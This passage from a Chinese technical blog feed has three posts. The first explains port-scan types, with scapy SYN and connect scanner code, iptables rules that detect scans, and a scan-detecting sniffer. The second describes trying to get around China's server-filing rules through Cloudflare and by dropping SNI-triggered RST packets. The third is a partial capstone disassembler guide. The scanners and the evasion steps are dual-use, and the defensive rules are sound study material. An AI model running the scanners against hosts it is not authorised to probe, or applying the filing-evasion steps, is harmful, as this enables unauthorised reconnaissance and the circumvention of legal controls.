允许正常的RST包</span></span><br>-A tcp_inval -p tcp --tcp-flags SYN,FIN,RST,ACK RST,ACK -j RETURN;<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># 记录异常包</span></span><br>-A tcp_inval -j LOG --log-prefix &quot;[STEALTH] &quot;;<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># 丢弃异常包</span></span><br>-A tcp_inval -j DROP;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">匹配大多数隐蔽扫描数据包（NULL,FIN,Xmas）</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">但是不检测ACK扫描，因为这可能导致误判</span><br>-A INPUT -p tcp ! --syn -m conntrack --ctstate INVALID -j tcp_inval;<br></code></pre></td></tr></table></figure><h1 id="半开扫描"><a href="#半开扫描" class="headerlink" title="半开扫描"></a>半开扫描</h1><p>半开扫描，基本思想是不完成完整的三次握手，以规避防火墙的检测</p><p>隐蔽扫描构造异常数据包，半开扫描构造的是合法数据包</p><h2 id="SYN扫描"><a href="#SYN扫描" class="headerlink" title="SYN扫描"></a>SYN扫描</h2><p>SYN扫描利用TCP三次握手机制，TCP三次握手此处不再赘述</p><p>RFC-793标准规定：当尝试连接到一个关闭的端口时，目标主机应返回一个RST响应，表示该端口不可达</p><blockquote><p>扫描器向目标端口发送SYN<br>端口开放，目标回复SYN-ACK<br>端口关闭，目标回复RST-ACK</p></blockquote><p>以下是一个SYN扫描器示例代码</p><p><img src="/articles/antiscan/3.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br>SYN = <span class="hljs-number">0x02</span><br>RST = <span class="hljs-number">0x04</span><br>ACK = <span class="hljs-number">0x10</span><br>SYN_ACK = <span class="hljs-number">0x12</span><br>RST_ACK = <span class="hljs-number">0x14</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">syn_scan</span>(<span class="hljs-params">ip:<span class="hljs-built_in">str</span>, port:<span class="hljs-built_in">int</span>, rst:<span class="hljs-built_in">bool</span> = <span class="hljs-literal">True</span>, timeout:<span class="hljs-built_in">int</span> = <span class="hljs-number">5</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    ip_pkt = IP(dst = ip)<br>    tcp_pkt = TCP(sport = RandShort()._fix(), dport = port, flags = <span class="hljs-string">&quot;S&quot;</span>)<br>    response = sr1(ip_pkt / tcp_pkt, timeout = timeout, verbose = <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> response <span class="hljs-keyword">and</span> response.haslayer(TCP):<br>        flags = response.getlayer(TCP).flags<br>        <span class="hljs-keyword">if</span> flags == SYN_ACK:<br>            <span class="hljs-keyword">if</span> rst:<br>                send(ip_pkt / TCP(sport = tcp_pkt.sport, dport = port, flags = <span class="hljs-string">&quot;RA&quot;</span>, seq = response.ack, ack = response.seq + <span class="hljs-number">1</span>), verbose = <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">elif</span> flags == RST_ACK:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;port&#125;</span> 未知flags：<span class="hljs-subst">&#123;flags&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;port&#125;</span> 服务器无响应&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">80</span>,<span class="hljs-number">443</span>,<span class="hljs-number">8889</span>,<span class="hljs-number">39001</span>]:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> syn_scan(<span class="hljs-string">&quot;目标IP&quot;</span>, i):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span> 开放&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span> 关闭&quot;</span>)<br>    <span class="hljs-keyword">except</span> RuntimeError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><p>完全阻止SYN扫描是不可能的，因为无法判断客户端发送的SYN是真实连接还是扫描尝试<br>唯一能做的，就是标记可能的SYN扫描，阻止进一步的扫描</p><p>注意到，SYN扫描特征：</p><blockquote><p>多次尝试连接不同的端口，且不完成完整的三次握手</p></blockquote><p>扫描器发送RST终止三次握手</p><p><img src="/articles/antiscan/1.png"></p><p>扫描器不发送RST，此时服务器多次重发SYN+ACK直到超时才终止三次握手</p><p><img src="/articles/antiscan/2.png"></p><p>iptables阻止SYN扫描：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">定义四个状态</span><br>SYN=401<br>CLOSED=402<br>SYNSCAN=403<br>ESTAB=404<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">标记关闭的连接</span><br>-N mark_closed<br>-A mark_closed -j CONNMARK --set-mark $CLOSED<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">标记已建立的连接</span><br>-N mark_estab<br>-A mark_estab -j CONNMARK --set-mark $ESTAB<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">tcp_new1链用于处理新TCP连接</span><br>-N tcp_new1<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># 处理回环接口特殊情况</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## 数据包来自回环接口且是SYN-ACK包，直接返回不做处理</span></span><br>-A tcp_new1 -i lo -p tcp --tcp-flags ALL SYN,ACK -j RETURN<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## 数据包来自回环接口且是RST-ACK包，跳转到mark_closed链，将连接标记为CLOSED状态</span></span><br>-A tcp_new1 -i lo -p tcp --tcp-flags ALL RST,ACK -g mark_closed<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># 处理正常TCP连接</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## 数据包是ACK包，跳转到mark_estab链，将连接标记为ESTAB状态</span></span><br>-A tcp_new1 -p tcp --tcp-flags ALL ACK -g mark_estab<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## 数据包不符合上述条件，将其标记为SYNSCAN状态</span></span><br>-A tcp_new1 -j CONNMARK --set-mark $SYNSCAN<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">匹配标记为SYN的连接，并将其交给tcp_new1链处理</span><br>-A INPUT -m connmark --mark $SYN -j tcp_new1<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">如果收到一个新的SYN包（即新连接），将其标记为SYN状态</span><br>-A INPUT -p tcp --syn -m conntrack --ctstate NEW -j CONNMARK --set-mark $SYN<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">处理SYN扫描的逻辑</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># 方式1：在tcp_new1链中直接跳转到handle_evil链</span></span><br>-A tcp_new1 -j handle_evil<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># 方式2：标记为SYNSCAN的连接丢到handle_evil链中</span></span><br>-A INPUT -m connmark --mark $SYNSCAN -j handle_evil<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">handle_evil链逻辑，比如禁止IP访问等</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">...</span><br></code></pre></td></tr></table></figure><h1 id="全开扫描"><a href="#全开扫描" class="headerlink" title="全开扫描"></a>全开扫描</h1><p>全开扫描经过三次握手建立完整的TCP连接，</p><p>半开扫描使用raw socket通常需要root权限，全开扫描主要用于无权限情况</p><h2 id="Connect扫描"><a href="#Connect扫描" class="headerlink" title="Connect扫描"></a>Connect扫描</h2><p>以下是一个Connect扫描器示例代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect_scan</span>(<span class="hljs-params">ip:<span class="hljs-built_in">str</span>, port:<span class="hljs-built_in">int</span>, timeout:<span class="hljs-built_in">int</span> = <span class="hljs-number">5</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> sock:<br>        sock.settimeout(timeout)<br>        <span class="hljs-keyword">try</span>:<br>            sock.connect((ip, port))<br>        <span class="hljs-keyword">except</span> (socket.timeout, socket.error):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">80</span>,<span class="hljs-number">443</span>,<span class="hljs-number">8889</span>,<span class="hljs-number">39001</span>]:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> connect_scan(<span class="hljs-string">&quot;121.40.34.51&quot;</span>, i):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span> 开放&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span> 关闭&quot;</span>)<br>    <span class="hljs-keyword">except</span> RuntimeError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><p>注意到，连接扫描特征：</p><blockquote><p>多次尝试连接不同的端口，连接建立后不发送任何数据就终止（RST或FIN）</p></blockquote><p>以下规则检测刚建立连接就立即断开的异常流量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">CNSCAN=406;<br>VALID=408;<br><br>-N mark_cnscan;<br>-A mark_cnscan -j CONNMARK --set-mark $CNSCAN;<br><br>-N tcp_new3;<br>-A tcp_new3 -p tcp --tcp-flags SYN,FIN,RST RST -g mark_cnscan;<br>-A tcp_new3 -p tcp --tcp-flags SYN,FIN,RST FIN -g mark_cnscan;<br>-A tcp_new3 -j CONNMARK --set-mark $VALID;<br><br>-A INPUT -m connmark --mark $ESTAB -j tcp_new3;<br></code></pre></td></tr></table></figure><h2 id="Grab扫描"><a href="#Grab扫描" class="headerlink" title="Grab扫描"></a>Grab扫描</h2><p>Grab扫描不仅检测端口是否开放，还会获取服务器返回的Banner信息以判断出服务器上运行的服务及其版本</p><p>连接建立后服务器返回Banner信息，客户端响应Banner的ACK后就断开连接</p><p>以下规则检测建立连接后发送一个ACK包就断开的异常流量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">-N tcp_new4;<br>-A tcp_new4 -p tcp --tcp-flags SYN,FIN,RST,ACK ACK<br>-m length --length 52 -j RETURN;<br>-A tcp_new4 -p tcp --tcp-flags SYN,FIN,RST RST -g mark_grscan;<br>-A tcp_new4 -p tcp --tcp-flags SYN,FIN,RST FIN -g mark_grscan;<br>-A tcp_new4 -j CONNMARK --set-mark $VALID;<br></code></pre></td></tr></table></figure><h1 id="真正的”暴力检测”"><a href="#真正的”暴力检测”" class="headerlink" title="真正的”暴力检测”"></a>真正的”暴力检测”</h1><p>依我看，要检测端口扫描哪有那么复杂，我连完整的连接都不跟踪了，那样只会复杂化算法，直接暴力判断某个IP是否多次发送不同目标端口的数据包就行</p><p>简单有效易维护，符合KISS原则（喜</p><p>正常一个网站阈值为4非常合理，普通用户最多访问80和443两个端口（笑</p><p>nmap扫一下，后台哐哐报</p><p><img src="/articles/antiscan/5.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ipaddress<br><br>PORT_SCAN_THRESHOLD = <span class="hljs-number">4</span><br>record = &#123;&#125;<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">packet_callback</span>(<span class="hljs-params">packet</span>):<br>    <span class="hljs-keyword">if</span> packet.haslayer(IP) <span class="hljs-keyword">and</span> packet.haslayer(TCP):<br>        src_ip = packet[IP].src<br>        dst_port = packet[TCP].dport<br><br>        <span class="hljs-keyword">if</span> ipaddress.IPv4Address(src_ip).is_global:<br>            <span class="hljs-keyword">if</span> src_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> record:<br>                record[src_ip] = []<br><br>            <span class="hljs-keyword">if</span> dst_port <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> record[src_ip]:<br>                record[src_ip].append(dst_port)<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(record[src_ip]) &gt;= PORT_SCAN_THRESHOLD:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;src_ip&#125;</span> 尝试端口扫描（IP可伪造仅供参考）&quot;</span>)<br>                <span class="hljs-keyword">del</span> record[src_ip]<br><br>sniff(iface=<span class="hljs-string">&quot;eth0&quot;</span>, prn=packet_callback, <span class="hljs-built_in">filter</span>=<span class="hljs-string">&quot;tcp&quot;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>论文研读</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>网络安全</tag>
      
      <tag>网络工程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>国内服务器如何免备案</title>
    <link href="/articles/bypass_icp/"/>
    <url>/articles/bypass_icp/</url>
    
    <content type="html"><![CDATA[<p><strong>服务器不备案是严重违反我国相关法律法规的行为，可能会面临严重的法律后果，包括但不限于网站被关闭、服务器被封禁、罚款以及承担刑事责任等。</strong><br><strong>本人已关停相关未备案服务器，已移除未备案DNS解析，本文章仅用于记录云服务器运维技术</strong><br><strong>广大用户应严格遵守法律法规，按照规定进行服务器备案，以合法、规范的方式开展互联网业务。</strong></p><p>阿里云99计划只能买大陆服务器，备案又太麻烦（要求多耗时长，备案过程中域名还不能解析，最重要的是备案就相当于实名上网了），便想到了套CDN免备案</p><p>配置好cloudflare和nginx，打开网站</p><p><img src="/articles/bypass_icp/1.png"></p><p>啪！报错。查看nginx日志发现连接被申必力量RST了</p><p><img src="/articles/bypass_icp/2.png"></p><p>都HTTPS加密了还能被RST，只有一种可能，那就是SNI阻断</p><p>openssl连接时可以用<code>-servername</code>指定SNI，测试一下果然是被SNI阻断了</p><p>我的未备案域名，连接被RST</p><p><img src="/articles/bypass_icp/3.png"></p><p>已备案域名，正常访问</p><p><img src="/articles/bypass_icp/4.png"></p><p>又多试了几个SNI，总结出一套阻断规律</p><table><thead><tr><th>SNI</th><th>阻断情况</th></tr></thead><tbody><tr><td>未注册域名</td><td>不阻断</td></tr><tr><td>大陆已备案域名</td><td>不阻断</td></tr><tr><td>大陆未备案域名</td><td>阻断</td></tr><tr><td>境外一般域名（指youtube,google等）</td><td>不阻断</td></tr><tr><td>境外____域名</td><td>阻断</td></tr></tbody></table><p>服务器上用tcpdump抓包显示，cloudflare到源服务器过程中并未启用加密SNI，并且RST紧随着client hello被发送（还一次发送6个，笑）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">tcpdump -s 0 -w capture.pcap<br></code></pre></td></tr></table></figure><p><img src="/articles/bypass_icp/5.png"></p><p><img src="/articles/bypass_icp/6.png"></p><p>cloudflare倒是可以自定义回源SNI，但是要企业订阅（<a href="https://developers.cloudflare.com/rules/origin-rules/#availability">https://developers.cloudflare.com/rules/origin-rules/#availability</a> ），一月200美元（汗</p><p>又试了非标端口，cloudflare自定义回源端口，同样被阻断</p><p>又尝试了无脑丢弃RST包的方法，是能绕过，但是不稳定，还是有报错525的可能，看来是双向RST阻断</p><p>不过这种方法太无脑了，鬼知道会不会产生一些奇怪的网络问题（汗</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">设置规则</span><br>iptables -I INPUT 1 -p tcp --dport 443 --tcp-flags RST RST -j DROP<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除规则</span><br>iptables -D INPUT -p tcp --dport 443 --tcp-flags RST RST -j DROP<br></code></pre></td></tr></table></figure><p>所以结论是：全端口SNI阻断，自定义回源SNI要企业订阅，加密SNI不普及，双向RST仅丢弃服务器端RST意义不大，所以根本没有最佳解决方案</p><p>一些小云厂商提供的免备案服务都是解析到境外CDN上，但这些大云不行，非但不提供免备案服务还不允许自行设置免备案，彻底封死了免备案的路，，，</p>]]></content>
    
    
    
    <tags>
      
      <tag>网络安全</tag>
      
      <tag>网络工程</tag>
      
      <tag>云服务器</tag>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>capstone x86 python非官方文档</title>
    <link href="/articles/man_capstone/"/>
    <url>/articles/man_capstone/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.capstone-engine.org/">capstone</a>是一个非常轻量易用的反汇编引擎，拥有非常简洁的API，支持多平台多语言</p><p>本文档仅涉及python和x86架构</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>从pip安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install capstone<br></code></pre></td></tr></table></figure><p>从pip更新</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install capstone --upgrade<br></code></pre></td></tr></table></figure><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><p>先来看一段非常简短的反汇编示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> capstone <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> capstone.x86 <span class="hljs-keyword">import</span> *<br><br>CODE = <span class="hljs-string">b&quot;\x55\x48\x8B\x05\xB8\x13\x00\x00\x48\x39\xC3\x74\x03\x48\x31\xC0\xC3&quot;</span><br><br>md = Cs(CS_ARCH_X86, CS_MODE_64)<br>md.detail = <span class="hljs-literal">True</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> md.disasm(CODE, <span class="hljs-number">0x1000</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;0x%x:\t%s\t%s&quot;</span> %(i.address, i.mnemonic, i.op_str))<br></code></pre></td></tr></table></figure><p>运行，输出为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x1000</span>: push rbp<br><span class="hljs-number">0x1001</span>: mov rax, qword ptr [rip + <span class="hljs-number">0x13b8</span>]<br><span class="hljs-number">0x1008</span>: cmp rbx, rax<br><span class="hljs-number">0x100b</span>: je <span class="hljs-number">0x1010</span><br><span class="hljs-number">0x100d</span>: xor rax, rax<br><span class="hljs-number">0x1010</span>: ret<br></code></pre></td></tr></table></figure><h1 id="Cs类"><a href="#Cs类" class="headerlink" title="Cs类"></a>Cs类</h1><p>两个初始化参数，第一个参数<code>arch</code>指定运行时宿主机架构（因为capstone的python实现本质上是ctypes调用动态库），第二个参数<code>mode</code>指定反汇编模式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cs</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, arch, mode</span>):<br>    <span class="hljs-comment">#...</span><br></code></pre></td></tr></table></figure><p>例如，将示例代码的模式更改为<code>CS_MODE_86</code>，输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x1000</span>: push ebp<br><span class="hljs-number">0x1001</span>: dec eax<br><span class="hljs-number">0x1002</span>: mov eax, dword ptr [<span class="hljs-number">0x13b8</span>]<br><span class="hljs-number">0x1008</span>: dec eax<br><span class="hljs-number">0x1009</span>: cmp ebx, eax<br><span class="hljs-number">0x100b</span>: je <span class="hljs-number">0x1010</span><br><span class="hljs-number">0x100d</span>: dec eax<br><span class="hljs-number">0x100e</span>: xor eax, eax<br><span class="hljs-number">0x1010</span>: ret<br></code></pre></td></tr></table></figure><p>将<code>detail</code>成员变量设置为True可以获得更详细反汇编的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">md.detail = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><h1 id="disasm方法"><a href="#disasm方法" class="headerlink" title="disasm方法"></a>disasm方法</h1><p><code>code</code>：要反汇编的二进制数据<br><code>offset</code>：代码起始地址<br><code>count</code>：反汇编数量，默认为0，为0则表示全部反汇编</p><p>返回生成器，可通过<code>list()</code>将其转换为数组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">disasm</span>(<span class="hljs-params">self, code, offset, count=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-comment">#...</span><br></code></pre></td></tr></table></figure><p>例如，将示例代码的<code>offset</code>更改为0，<code>count</code>更改为3，运行<br>显而易见，只输出了3条，而且起始地址为0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x0</span>: push ebp<br><span class="hljs-number">0x1</span>: dec eax<br><span class="hljs-number">0x2</span>: mov eax, dword ptr [<span class="hljs-number">0x13b8</span>]<br></code></pre></td></tr></table></figure><h1 id="ModR-M字节、REX字节、SIB字节和SIB寻址"><a href="#ModR-M字节、REX字节、SIB字节和SIB寻址" class="headerlink" title="ModR&#x2F;M字节、REX字节、SIB字节和SIB寻址"></a>ModR&#x2F;M字节、REX字节、SIB字节和SIB寻址</h1><p>ModR&#x2F;M字节用于指定指令的操作数和寻址模式，由<code>mod</code>（2位），<code>reg/opcode</code>（3位），和<code>rm</code>（3位）三部分组成</p><ul><li><code>mod</code>：指定寻址模式<ul><li><code>00</code>：寄存器间接寻址或直接内存寻址</li><li><code>01</code>：8位偏移寄存器间接寻址</li><li><code>10</code>：32位偏移寄存器间接寻址</li><li><code>11</code>：寄存器直接寻址</li></ul></li><li><code>reg/opcode</code>：指定寄存器或操作码扩展</li><li><code>rm</code>：指定寄存器或内存操作数</li></ul><hr><p>SIB（Scale-Index-Base）寻址使用<code>segment:[base + index * scale + displacement]</code>表示</p><p>例如<code>mov ecx, ds:[eax + ebx * 4 + 16]</code>，<code>ds</code>是段寄存器（segment）（准确一点应该叫段选择子，因为现代x86架构中段寄存器存放的不是真的段地址），<code>eax</code>是基址寄存器（base），<code>ebx</code>是索引寄存器（index），<code>4</code>是比例因子（scale），<code>16</code>是位移（displacement）</p><p>SIB寻址看起来长，原始二进制数据就1字节大（就是所谓的SIB字节），格式<code>SSIIIBBB</code></p><ul><li><code>SS</code>（Scale）：比例因子（1, 2, 4, 8）</li><li><code>III</code>（Index）：索引寄存器</li><li><code>BBB</code>（Base）：基址寄存器</li></ul><hr><p>REX字节用于扩展寄存器和操作数的位数，格式为 &#96;0100 WRXB</p><ul><li><code>0100</code>：是常量魔数</li><li><code>W</code>：指定操作数大小，1为64位，0为32位</li><li><code>R</code>：扩展<code>ModR/M</code>字节中的<code>reg/opcode</code>字段</li><li><code>X</code>：扩展<code>SIB</code>字节中的<code>Index</code>字段</li><li><code>B</code>：扩展<code>ModR/M</code>字节中的<code>rm</code>字段或<code>SIB</code>字节中的<code>Base</code>字段</li></ul><p><strong>很复杂，但是了解就行，capstone都已经解析好了，就在CsInsn类的operands中</strong></p><h1 id="CsInsn类"><a href="#CsInsn类" class="headerlink" title="CsInsn类"></a>CsInsn类</h1><p>disasm返回的生成器用来生成CsInsn类</p><table><thead><tr><th>成员变量</th><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>addr_size</td><td>int</td><td>地址大小，该值固定，取决于反汇编模式：32位是4，64位是8</td></tr><tr><td>address</td><td>int</td><td>指令地址</td></tr><tr><td>avx_cc</td><td>int</td><td>AVX指令的条件码（Condition Code）</td></tr><tr><td>avx_rm</td><td>int</td><td>AVX指令浮点运算的舍入模式（Rounding Mode）</td></tr><tr><td>avx_sae</td><td>bool</td><td>AVX指令的SAE（Suppress All 